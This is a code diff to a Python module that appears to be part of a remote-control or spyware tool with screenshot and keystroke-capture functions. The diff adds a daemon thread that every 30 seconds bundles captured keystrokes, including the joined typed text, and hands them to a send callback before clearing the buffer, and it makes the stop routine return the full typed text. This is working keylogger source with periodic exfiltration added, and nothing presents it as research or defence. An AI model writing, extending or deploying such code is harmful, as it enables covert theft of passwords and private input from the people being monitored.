@@ -6,12 +6,17 @@ from datetime import datetime
 import pyautogui
 import cv2
 from pynput import keyboard
+import threading
+import time
 
 # Global keylogger state
 keylogger_running = False
 keylogger_listener = None
 captured_keys = []
 MAX_KEYLOG_BUFFER = 1000  # Maximum number of keystrokes to store
+
+# Add a callback for sending results
+keylog_send_callback = None
 
 def take_screenshot():
     """Take a screenshot of the current screen"""
@@ -123,15 +128,34 @@ def on_key_press(key):
     if len(captured_keys) > MAX_KEYLOG_BUFFER:
         captured_keys = captured_keys[-MAX_KEYLOG_BUFFER:]
 
-def start_keylogger():
-    """Start the keylogger"""
-    global keylogger_running, keylogger_listener
-    
+# Periodically send keylog data
+def periodic_keylog_send(interval=30):
+    global captured_keys, keylogger_running, keylog_send_callback
+    while keylogger_running:
+        time.sleep(interval)
+        if captured_keys and keylog_send_callback:
+            full_text = ''.join([k['key'] for k in captured_keys])
+            keylog_send_callback({
+                'status': 'success',
+                'message': 'Periodic keylog update',
+                'captured_keys': captured_keys.copy(),
+                'text': full_text,
+                'timestamp': datetime.now().isoformat()
+            })
+            captured_keys = []
+
+# Modify start_keylogger to accept a send callback
+def start_keylogger(send_callback=None):
+    global keylogger_running, keylogger_listener, keylog_send_callback
     if not keylogger_running:
         try:
+            keylog_send_callback = send_callback
             keylogger_listener = keyboard.Listener(on_press=on_key_press)
             keylogger_listener.start()
             keylogger_running = True
+            # Start periodic sender thread
+            if send_callback:
+                threading.Thread(target=periodic_keylog_send, daemon=True).start()
             return {
                 'status': 'success',
                 'message': 'Keylogger started',
@@ -151,20 +175,21 @@ def start_keylogger():
             'timestamp': datetime.now().isoformat()
         }
 
+# Modify stop_keylogger to include full text
 def stop_keylogger():
-    """Stop the keylogger and return captured keys"""
     global keylogger_running, keylogger_listener, captured_keys
-    
     if keylogger_running:
         try:
             keylogger_listener.stop()
             keylogger_running = False
             keys = captured_keys.copy()
+            full_text = ''.join([k['key'] for k in keys])
             captured_keys = []
             return {
                 'status': 'success',
                 'message': 'Keylogger stopped',
                 'captured_keys': keys,
+                'text': full_text,
                 'timestamp': datetime.now().isoformat()
             }
         except Exception as e:
